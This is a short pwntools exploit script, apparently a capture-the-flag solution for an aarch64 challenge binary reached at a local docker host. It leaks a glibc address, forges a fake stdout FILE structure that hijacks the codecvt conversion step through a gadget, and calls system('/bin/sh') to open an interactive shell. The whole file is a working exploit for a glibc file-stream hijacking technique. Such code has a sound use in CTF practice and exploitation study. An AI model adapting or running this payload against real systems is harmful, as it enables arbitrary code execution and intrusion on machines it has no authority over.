from pwn import *

context.arch = 'aarch64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chal', '''
#     # b *__libio_codecvt_out+144
#     brva 0x948
#     continue
# ''')

# p = process('./chal')

p = remote('host.docker.internal', 21007)

glibc_e = ELF('./libc.so.6')

glibc_base_addr = u64((b'\x20\x15'+p.recv(2)+b'\xff\xff').ljust(8, b'\x00'))-glibc_e.sym['_IO_2_1_stdout_']
log.info(f"glibc base address: {hex(glibc_base_addr)}")

payload = flat({
    0x0: 1, # stdout->_flags
    0x10: 0, # stdout->_codecvt->__cd_out.step.__shlib_handle
    0x18: glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0x10, # stdout->_codecvt->__cd_out.step
    0x20: 0, # stdout->_IO_write_base
    0x28: 1, # stdout->_IO_write_ptr / stdout->_wide_data->_IO_write_base
    0x30: 0, # stdout->_IO_write_end / stdout->_wide_data->_IO_write_ptr
    0x38: glibc_base_addr+0x12c1cc, # stdout->_codecvt->__cd_out.step.__fct / 0x000000000012c1cc: ldr x0, [x19, #0xd0]; ldr x1, [x0, #0x38]; cbz x1, #0x12c120; add x0, x19, #0xc8; blr x1;
    0x88-0x48: glibc_base_addr+0x1b2560, # stdout->_lock
    0x98-0x48: glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']-0x20, # stdout->_codecvt
    0xa0-0x48: glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0x10, # stdout->_wide_data
    0xa8-0x48: b'/bin/sh\x00',
    0xb0-0x48: glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0x80,
    0xb8-0x48: glibc_base_addr+glibc_e.sym.system,
    0xc0-0x48: 1 # stdout->_mode
}, filler=b'\x00', length=0x80)
p.send(payload)

p.interactive()